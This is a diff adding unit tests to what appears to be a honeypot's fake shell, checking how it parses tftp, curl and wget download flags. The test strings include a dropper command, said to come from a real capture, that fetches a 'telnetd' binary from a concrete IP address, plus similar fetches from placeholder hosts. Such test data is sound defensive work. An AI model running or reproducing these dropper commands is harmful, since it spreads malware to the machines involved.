@@ -523,3 +523,21 @@ def test_tftp_host_is_not_confused_with_option_values():
 def test_tftp_without_a_host_is_not_a_download():
     for line in ("tftp -g -r only-a-file", "tftp -g -r"):  # -r consumes the file name
         assert dispatch(line, _fs(), PersonaConfig(arch="riscv64")).download_request is None
+
+
+def test_curl_capital_O_takes_no_argument_and_uses_the_remote_name():
+    # Straight from a captured dropper: `curl -O http://host/nokillbins/telnetd`.
+    persona = PersonaConfig(arch="riscv64")
+    req = dispatch("curl -O http://213.232.114.14/nokillbins/telnetd", _fs(), persona).download_request
+    assert req.url == "http://213.232.114.14/nokillbins/telnetd"
+    assert req.requested_filename == "telnetd"
+    req = dispatch("curl -s -O http://1.2.3.4/a/b.sh", _fs(), persona).download_request
+    assert req.requested_filename == "b.sh"
+
+
+def test_wget_output_and_log_flags():
+    persona = PersonaConfig(arch="riscv64")
+    assert dispatch("wget -O out http://1.2.3.4/x", _fs(), persona).download_request.requested_filename == "out"
+    assert dispatch("wget -Oout http://1.2.3.4/x", _fs(), persona).download_request.requested_filename == "out"
+    # lowercase -o is wget's log file, not the saved file
+    assert dispatch("wget -o log.txt http://1.2.3.4/x", _fs(), persona).download_request.requested_filename == "x"
